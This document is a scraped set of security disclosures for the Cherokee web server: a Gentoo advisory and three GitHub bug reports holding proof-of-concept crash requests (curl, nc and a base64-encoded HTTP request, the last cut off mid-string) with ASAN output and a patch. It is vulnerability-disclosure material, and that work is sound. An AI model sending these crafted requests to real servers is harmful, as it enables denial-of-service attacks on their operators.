=== Content from security.gentoo.org_7e73bbda_20250121_011115.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Cherokee: Multiple vulnerabilities — GLSA **202012-09**

Multiple vulnerabilities have been found in Cherokee, the worst of
which could result in a Denial of Service condition.

### Affected packages

| Package | **www-servers/cherokee** on all architectures |
| --- | --- |
| Affected versions | <= **1.2.104-r2** |
| Unaffected versions |  |

### Background

Cherokee is an extra-light web server.

### Description

Multiple vulnerabilities have been discovered in Cherokee. Please review
the CVE identifiers referenced below for details.

### Impact

Please review the referenced CVE identifiers for details.

### Workaround

There is no known workaround at this time.

### Resolution

Gentoo has discontinued support for Cherokee. We recommend that users
unmerge package:

```
 # emerge --unmerge "www-servers/cherokee"

```
### References

* [CVE-2006-1681](https://nvd.nist.gov/vuln/detail/CVE-2006-1681)
* [CVE-2019-20798](https://nvd.nist.gov/vuln/detail/CVE-2019-20798)
* [CVE-2019-20799](https://nvd.nist.gov/vuln/detail/CVE-2019-20799)
* [CVE-2019-20800](https://nvd.nist.gov/vuln/detail/CVE-2019-20800)
* [CVE-2020-12845](https://nvd.nist.gov/vuln/detail/CVE-2020-12845)

**Release date**

December 23, 2020

**Latest revision**

December 23, 2020: 1

**Severity**

low

**Exploitable**

remote

**Bugzilla entries**

* [715204](https://bugs.gentoo.org/show_bug.cgi?id=715204)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from github.com_5f2bceb0_20250121_011111.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1221)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1221)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cherokee%2Fwebserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cherokee](/cherokee)
/
**[webserver](/cherokee/webserver)**
Public

* [Notifications](/login?return_to=%2Fcherokee%2Fwebserver) You must be signed in to change notification settings
* [Fork
  104](/login?return_to=%2Fcherokee%2Fwebserver)
* [Star
   567](/login?return_to=%2Fcherokee%2Fwebserver)

* [Code](/cherokee/webserver)
* [Issues
  423](/cherokee/webserver/issues)
* [Pull requests
  11](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects
  0](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

Additional navigation options

* [Code](/cherokee/webserver)
* [Issues](/cherokee/webserver/issues)
* [Pull requests](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

# remote null pointer dereference trigger in admin handler #1221

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[remote null pointer dereference trigger in admin handler](#top)#1221Copy linkAssignees [![skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)](/skinkie)Labels[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=80)
## Description

![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=48)[mmmds](https://github.com/mmmds)opened [on Jul 25, 2019](https://github.com/cherokee/webserver/issues/1221#issue-472900471)

It's possible to trigger NULL pointer dereference in case if request uses POST method with empty body.

cherokee/handler\_admin.c

```
[...]
204  ret_t
205  cherokee_handler_admin_read_post (cherokee_handler_admin_t *hdl)
206  {
207  	int                      re;
208  	ret_t                    ret;
209  	char                    *tmp;
210  	cherokee_buffer_t        post = CHEROKEE_BUF_INIT;
211  	cherokee_buffer_t        line = CHEROKEE_BUF_INIT;
212  	cherokee_connection_t   *conn = HANDLER_CONN(hdl);
213
214  	/* Check for the post info
215  	 */
216  	if (! conn->post.has_info) {
217  		conn->error_code = http_bad_request;
218  		return ret_error;
219  	}
220
221  	/* Process line per line
222  	 */
223  	ret = cherokee_post_read (&conn->post, &conn->socket, &post);
224  	switch (ret) {
225  	case ret_ok:
226  	case ret_eagain:
227  		break;
228  	default:
229  		conn->error_code = http_bad_request;
230  		return ret_error;
231  	}
232
233  	/* Parse
234  	 */
235  	TRACE (ENTRIES, "Post contains: '%s'\n", post.buf);
236
237  	cherokee_dwriter_list_open (&hdl->dwriter);
238
239  	for (tmp = post.buf;;) {
240  		char *end1 = strchr (tmp, CHR_LF);
[...]

```

If post body is empty then post.buf is NULL and strchr on tmp results in

NULL pointer dereference.

### Proof of concept:

```
curl -d "" http://127.0.0.1:8765/test15/

```

test15 is the admin handler.

```
### ASAN report:

=================================================================
==494==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f221a131ad3 bp 0x7f2213bf4be0 sp 0x7f2213bf4368 T8)
    #0 0x7f221a131ad2  (/lib/x86_64-linux-gnu/libc.so.6+0x89ad2)
    #1 0x7f221b898236 in strchr (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x71236)
    #2 0x5098f2 in cherokee_handler_admin_read_post /home/shm/src/webserver/cherokee/handler_admin.c:240
    #3 0x546dfe in cherokee_handler_read_post /home/shm/src/webserver/cherokee/handler.c:107
    #4 0x53770c in cherokee_connection_read_post /home/shm/src/webserver/cherokee/connection.c:684
    #5 0x489273 in process_active_connections /home/shm/src/webserver/cherokee/thread.c:1235
    #6 0x48df03 in cherokee_thread_step_MULTI_THREAD /home/shm/src/webserver/cherokee/thread.c:2086
    #7 0x48239f in thread_routine /home/shm/src/webserver/cherokee/thread.c:99
    #8 0x7f221ad316b9 in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76b9)
    #9 0x7f221a1af41c in clone (/lib/x86_64-linux-gnu/libc.so.6+0x10741c)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV ??:0 ??
Thread T8 created by T0 here:
    #0 0x7f221b85d253 in pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x36253)
    #1 0x483292 in cherokee_thread_new /home/shm/src/webserver/cherokee/thread.c:247
    #2 0x46ded5 in initialize_server_threads /home/shm/src/webserver/cherokee/server.c:671
    #3 0x4700f2 in cherokee_server_initialize /home/shm/src/webserver/cherokee/server.c:1053
    #4 0x417e26 in common_server_initialization /home/shm/src/webserver/cherokee/main_worker.c:255
    #5 0x41881d in main /home/shm/src/webserver/cherokee/main_worker.c:393
    #6 0x7f221a0c882f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)

==494==ABORTING

```
### Setup:

* Ubuntu 18.04 64 bit
* source code from github, commit [9a75e65](https://github.com/cherokee/webserver/commit/9a75e65b876bcc376cb6b379dca1f7ce4a055c59)
* build command:

```
ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make

```

* files in webroot `mkdir /var/www/test{1..20}; for i in` seq 1 20`; do echo test > test$i/test.html; done`
* configuration file [cherokee.txt](https://github.com/cherokee/webserver/files/3432046/cherokee.txt)

found by: Mateusz Kocielski, Michał Dardas from LogicalTrust

## Metadata

### Assignees

* [![@skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)skinkie](/skinkie)
### Labels

[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_01033336_20250121_011112.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1222)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1222)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cherokee%2Fwebserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cherokee](/cherokee)
/
**[webserver](/cherokee/webserver)**
Public

* [Notifications](/login?return_to=%2Fcherokee%2Fwebserver) You must be signed in to change notification settings
* [Fork
  104](/login?return_to=%2Fcherokee%2Fwebserver)
* [Star
   567](/login?return_to=%2Fcherokee%2Fwebserver)

* [Code](/cherokee/webserver)
* [Issues
  423](/cherokee/webserver/issues)
* [Pull requests
  11](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects
  0](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

Additional navigation options

* [Code](/cherokee/webserver)
* [Issues](/cherokee/webserver/issues)
* [Pull requests](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

# escape\_with\_table invalid access #1222

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[escape\_with\_table invalid access](#top)#1222Copy linkAssignees [![skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)](/skinkie)Labels[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=80)
## Description

![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=48)[mmmds](https://github.com/mmmds)opened [on Jul 25, 2019](https://github.com/cherokee/webserver/issues/1222#issue-472902318)

cherokee/buffer.c:

```
[...]
escape_with_table (cherokee_buffer_t *buffer,
1342                     cherokee_buffer_t *src,
1343                     uint32_t          *is_char_escaped)
[...]
1346  	const char *s,*s_next;
[...]
1359  	s = src->buf;
1360  	do {
1361  		s_next = utf8_get_next_char (s);
1362
1363  		/* It's single-byte character */
1364  		if ((s_next - s) == 1) {
1365
1366  			/* Check whether it has to be escaped */
1367  			if (is_char_escaped[*s >> 5] & (1 << (*s & 0x1f))) {
[...]

```

in the line 1367 \*s is used to index is\_char\_escaped table. Because \*s is signed

then we can get (negative value) >> 5 which results in negative value, so

we access memory *before* is\_char\_escaped.

### Simple PoC to reproduce

```
echo -e "GET http://SilaHonorUlica/test8/test\xff.html HTTP/1.1\nHost: xoxoxo\nUser-Agent: netcat\n\n" | nc ::1 8765

```

test8 is a handler for proxy module

### Patch for this issue:

```
diff --git a/cherokee/buffer.c b/cherokee/buffer.c
index d93c163..9250c5c 100644
--- a/cherokee/buffer.c
+++ b/cherokee/buffer.c
@@ -1343,8 +1343,8 @@ escape_with_table (cherokee_buffer_t *buffer,
                    uint32_t          *is_char_escaped)
 {
        char *t;
-       const char *s,*s_next;
-       char *end;
+       const unsigned char *s,*s_next;
+       unsigned char *end;
        cuint_t        n_escape    = 0;
        static char    hex_chars[] = "0123456789abcdef";

```
### Setup:

* Ubuntu 18.04 64 bit
* source code from github, commit [9a75e65](https://github.com/cherokee/webserver/commit/9a75e65b876bcc376cb6b379dca1f7ce4a055c59)
* build command:

```
ac_cv_func_realloc_0_nonnull=yes ac_cv_func_malloc_0_nonnull=yes LDFLAGS="-lasan" LDADD="-lasan" CFLAGS="-fsanitize=address -ggdb -O0 -fprofile-arcs -ftest-coverage" ./configure --prefix=`pwd`/bin --enable-trace --enable-static-module=all --enable-static --enable-shared=no
make

```

* files in webroot `mkdir /var/www/test{1..20}; for i in` seq 1 20`; do echo test > test$i/test.html; done`
* configuration file [cherokee.txt](https://github.com/cherokee/webserver/files/3432046/cherokee.txt)

found by: Mateusz Kocielski, Michał Dardas from LogicalTrust

## Metadata

### Assignees

* [![@skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)skinkie](/skinkie)
### Labels

[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)
### Type

No type
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7e5762a2_20250121_011113.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1225)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fcherokee%2Fwebserver%2Fissues%2F1225)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=cherokee%2Fwebserver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[cherokee](/cherokee)
/
**[webserver](/cherokee/webserver)**
Public

* [Notifications](/login?return_to=%2Fcherokee%2Fwebserver) You must be signed in to change notification settings
* [Fork
  104](/login?return_to=%2Fcherokee%2Fwebserver)
* [Star
   567](/login?return_to=%2Fcherokee%2Fwebserver)

* [Code](/cherokee/webserver)
* [Issues
  423](/cherokee/webserver/issues)
* [Pull requests
  11](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects
  0](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

Additional navigation options

* [Code](/cherokee/webserver)
* [Issues](/cherokee/webserver/issues)
* [Pull requests](/cherokee/webserver/pulls)
* [Actions](/cherokee/webserver/actions)
* [Projects](/cherokee/webserver/projects)
* [Wiki](/cherokee/webserver/wiki)
* [Security](/cherokee/webserver/security)
* [Insights](/cherokee/webserver/pulse)

# heap-buffer-overflow in handler cgi #1225

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[heap-buffer-overflow in handler cgi](#top)#1225Copy linkAssignees [![skinkie](https://avatars.githubusercontent.com/u/502394?s=64&u=f7e7f76f74720518c262536906c9c51e45c3fd6e&v=4)](/skinkie)Labels[has-patch](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22has-patch%22)[t:bug](https://github.com/cherokee/webserver/issues?q=state%3Aopen%20label%3A%22t%3Abug%22)![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=80)
## Description

![@mmmds](https://avatars.githubusercontent.com/u/4034742?v=4&size=48)[mmmds](https://github.com/mmmds)opened [on Jul 25, 2019](https://github.com/cherokee/webserver/issues/1225#issue-472906399)
### PoC

```
echo -n 'R0VUIC90ZXN0MTAvdGVzdC5odG1sIEhUVFAvMS4xCkFjY2VwdDogMTI3LjAuMC4xCkFjY2VwdC1DaGFyc2V0OiAxMjcuMC4wLjEKQWNjZXB0LUVuY29kaW5nOiAxMjcuMC4wLjEKQWNjZXB0LUxhbmd1YWdlOiAxMjcuMC4wLjEKQXV0aG9yaXphdGlvbjogMTI3LjAuMC4xCkNhY2hlLUNvbnRyb2w6IDEyNy4wLjAuMQpDaGFyZ2UtVG86IDEyNy4wLjAuMQpDb25uZWN0aW9uOiAxMjcuMC4wLjEKQ29udGVudC1UeXBlOiAxMjcuMC4wLjEKQ29va2llOiAxMjcuMC4wLjEKRE5UOiAxMjcuMC4wLjEKRXhwZWN0OiAxMjcuMC4wLjEKRm9yd2FyZGVkOiAxMjcuMC4wLjEKRnJvbTogMTI3LjAuMC4xCkZyb250LUVuZC1IdHRwZDogMTI3LjAuMC4xCkhvc3Q6IDEyNy4wLjAuMQpJZi1NYXRjaDogMTI3LjAuMC4xCklmLU1vZGlmaWVkLVNpbmNlOiAxMjcuMC4wLjEKSWYtTm9uZS1NYXRjaDogMTI3LjAuMC4xCklmLVJhbmdlOiAxMjcuMC4wLjEKSWYtVW5tb2RpZmllZC1TaW5jZTogMTI3LjAuMC4xCktlZXAtQWxpdmU6IDEyNy4wLjAuMQpNYXgtRm9yd2FyZHM6IDEyNy4wLjAuMQpOZWdvdGlhdGU6IDEyNy4wLjAuMQpQcmFnbWE6IDEyNy4wLjAuMQpQcm94eS1BdXRob3JpemF0aW9uOiAxMjcuMC4wLjEKUHJveHktQ29ubmVjdGlvbjogMTI3LjAuMC4xCk9yaWdpbjogMTI3LjAuMC4xClJhbmdlOiAxMjcuMC4wLjEKVEU6IDEyNy4wLjAuMQpUcmFuc2Zlci1FbmNvZGluZzogMTI3LjAuMC4xClRyYW5zZmVyLUVuY29kaW5nOiAxMjcuMC4wLjEKVXBncmFkZTogMTI3LjAuMC4xClVwZ3JhZGU6IDEyNy4wLjAuMQpVc2VyLUFnZW50OiAxMjcuMC4wLjEKVXNlci1BZ2VudDogMTI3LjAuMC4xClVzZXItQWdlbnQ6IDEyNy4wLjAuMQpWaWE6IDEyNy4wLjAuMQpQcm94eS1BdXRob3JpemF0aW9uOiAxMjcuMC4wLjEKUHJveHktQ29ubmVjdGlvbjogMTI3LjAuMC4xCk9yaWdpbjogMTI3LjAuMC4xClJhbmdlOiAxMjcuMC4wLjEKUmVmZXJlcjogMTI3LjAuMC4xClJlZmVyZXI6IDEyNy4wLjAuMQpSZXF1ZXN0LVJhbmdlOiAxMjcuMC4wLjEKVEU6IDEyNy4wLjAuMQpUcmFuc2Zlci1FbmNvZGluZzogMTI3LjAuMC4xClRyYW5zZmVyLUVuY29kaW5nOiAxMjcuMC4wLjEKVXBncmFkZTogMTI3LjAuMC4xClVwZ3JhZGU6IDEyNy4wLjAuMQpVc2VyLUFnZW50OiAxMjcuMC4wLjEKVXNlci1BZ2VudDogMTI3LjAuMC4xClVzZXItQWdlbnQ6IDEyNy4wLjAuMQpWaWE6IDEyNy4wLjAuMQpYLUFUVC1EZXZpY2VJZDogMTI3LjAuMC4xClgtRm9yd2FyZGVkLUZvcjogMTI3LjAuMC4xClgtRm9yd2FyZGVkLUhvc3Q6IDEyNy4wLjAuMQpYLUZvcndhcmRlZC1Qcm90bzogMTI3LjAuMC4xClgtRm9yd2FyZGVkLVNlcnZlcjogMTI3LjAuMC4xClgtUmVxdWVzdGVkLVdpdGg6IDEyNy4wLjAuMQpYLWxvcmktdGltZS0xOiAxMjcuMC4wLjEKWC1Eby1Ob3QtVHJhY2s6IDEyNy4wLjAuMQpYLUNv